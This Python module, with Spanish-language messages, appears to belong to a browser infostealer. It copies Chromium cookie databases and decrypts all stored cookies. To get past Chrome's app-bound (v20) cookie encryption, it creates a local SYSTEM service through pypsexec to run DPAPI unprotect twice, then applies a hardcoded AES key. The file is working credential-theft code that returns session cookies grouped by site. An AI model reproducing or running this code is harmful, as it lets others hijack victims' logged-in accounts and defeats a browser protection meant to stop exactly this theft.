# cookies.py
import sqlite3, json, binascii, base64
from Crypto.Cipher import AES
import os
from utils import temporary_copy, get_full_path, timestamp_to_datetime, extract_key_from_local_state
from config import RED, GREEN, RESET, BROWSER_PATHS

def get_chrome_v20_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state["os_crypt"].get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            raise Exception("No se encontró 'app_bound_encrypted_key' en Local State.")
        app_bound_bytes = binascii.a2b_base64(app_bound_encrypted_key)
        if not app_bound_bytes.startswith(b"APPB"):
            raise Exception("El formato de app_bound_encrypted_key no es el esperado.")
        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_bytes[4:]).decode().strip()
        arguments = "-c \"" + (
            "import win32crypt; import binascii; "
            "encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0); "
            "print(binascii.b2a_base64(encrypted_key[1]).decode().strip())"
        ) + "\""
        from pypsexec.client import Client
        import sys
        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            encrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=arguments.format(app_bound_encrypted_key_b64),
                use_system_account=True
            )
            encrypted_key_b64 = encrypted_key_b64.strip()
            decrypted_key_b64, stderr, rc = c.run_executable(
                sys.executable,
                arguments=arguments.format(encrypted_key_b64.decode().strip()),
                use_system_account=False
            )
            decrypted_key_b64 = decrypted_key_b64.strip()
            decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
            if decrypted_key[0] != 1:
                raise Exception("Formato inesperado en decrypted_key.")
        finally:
            c.remove_service()
            c.disconnect()
        aes_key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
        iv = decrypted_key[1:13]
        ciphertext = decrypted_key[13:13+32]
        tag = decrypted_key[-16:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        v20_key = cipher.decrypt_and_verify(ciphertext, tag)
        return v20_key
    except Exception as e:
        print(f"{RED}[!] Error obteniendo clave v20: {e}{RESET}")
        return None

def get_cookie_file_path(browser_name):
    return get_full_path(browser_name, "cookies")

def get_local_state_path(browser_name):
    browser = browser_name.lower()
    user_home = os.path.expanduser("~")
    if browser in BROWSER_PATHS and "local_state" in BROWSER_PATHS[browser]:
        return os.path.join(user_home, BROWSER_PATHS[browser]["local_state"])
    return None

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode('utf-8', errors='replace')
    except Exception as e:
        return f"[ERROR DESCIFRANDO]: {e}"

def decrypt_cookie_v20(encrypted_value, v20_key):
    try:
        cookie_iv = encrypted_value[3:15]
        encrypted_cookie = encrypted_value[15:-16]
        cookie_tag = encrypted_value[-16:]
        cipher = AES.new(v20_key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8', errors='replace')
    except Exception as e:
        return f"[ERROR DESCIFRANDO v20]: {e}"

def fetch_chromium_cookies(browser_name):
    cookie_db_path = get_cookie_file_path(browser_name)
    local_state_path = get_local_state_path(browser_name)
    if not cookie_db_path or not os.path.exists(cookie_db_path):
        print(f"{RED}[!] No se encontró el archivo de cookies para {browser_name}.{RESET}")
        return {}
    with temporary_copy(cookie_db_path, suffix="_tmp") as tmp_cookie_db:
        master_key = extract_key_from_local_state(local_state_path)
        v20_key = None
        if browser_name.lower() == "chrome":
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    ls_data = json.load(f)
                if "app_bound_encrypted_key" in ls_data["os_crypt"]:
                    v20_key = get_chrome_v20_key(local_state_path)
            except Exception as e:
                print(f"{RED}[!] Error obteniendo clave v20: {e}{RESET}")
        grouped_data = {}
        try:
            conn = sqlite3.connect(tmp_cookie_db)
            conn.text_factory = lambda x: x
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host_key, name, CAST(encrypted_value AS BLOB), creation_utc, last_access_utc, expires_utc
                FROM cookies
            """)
            for row in cursor.fetchall():
                host_key = row[0].decode() if isinstance(row[0], bytes) else row[0]
                cookie_name = row[1].decode() if isinstance(row[1], bytes) else row[1]
                encrypted_value = row[2]
                creation_utc = row[3]
                last_access_utc = row[4]
                expires_utc = row[5]
                if encrypted_value[:3] == b'v20' and v20_key is not None:
                    decrypted_value = decrypt_cookie_v20(encrypted_value, v20_key)
                else:
                    decrypted_value = decrypt_value(encrypted_value, master_key) if master_key else "[NO KEY]"
                cookie_data = {
                    'name': cookie_name,
                    'decrypted_value': decrypted_value,
                    'creation_utc': timestamp_to_datetime(creation_utc),
                    'last_access_utc': timestamp_to_datetime(last_access_utc),
                    'expires_utc': timestamp_to_datetime(expires_utc)
                }
                if host_key not in grouped_data:
                    grouped_data[host_key] = []
                grouped_data[host_key].append(cookie_data)
            conn.close()
        except Exception as e:
            print(f"{RED}[!] Error al leer la base de datos de cookies: {e}{RESET}")
        return grouped_data
